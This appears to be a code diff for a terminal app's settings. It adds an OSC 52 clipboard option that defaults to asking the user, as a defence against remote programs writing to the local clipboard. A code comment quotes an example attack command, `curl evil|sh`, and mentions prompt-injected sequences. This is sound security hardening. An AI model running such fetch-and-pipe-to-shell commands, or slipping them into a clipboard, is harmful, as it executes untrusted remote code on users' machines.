@@ -77,6 +77,10 @@ export interface TerminalSettings {
   fontSize: number
   selectionAction: 'none' | 'copy'
   rightClickAction: 'none' | 'menu' | 'paste'
+  // F-12.5: how OSC 52 (a remote program writing the LOCAL clipboard) is
+  // handled. Default 'ask': a prompt-injected sequence can otherwise drop
+  // `curl evil|sh` into the clipboard and wait for a paste.
+  osc52Clipboard: 'ask' | 'allow' | 'deny'
   middleClickAction: 'none' | 'paste' | 'menu'
   // Ctrl/Cmd + mouse wheel zooms the terminal font. Can be turned off (issue
   // #671) for scroll-sensitive mice; defaults to enabled.
@@ -389,6 +393,7 @@ export const DEFAULT_SETTINGS: AppSettings = {
     fontSize: 14,
     selectionAction: 'none',
     rightClickAction: 'menu',
+    osc52Clipboard: 'ask',
     middleClickAction: 'paste',
     maxHistoryLines: 2500,
     smartCompletion: true,
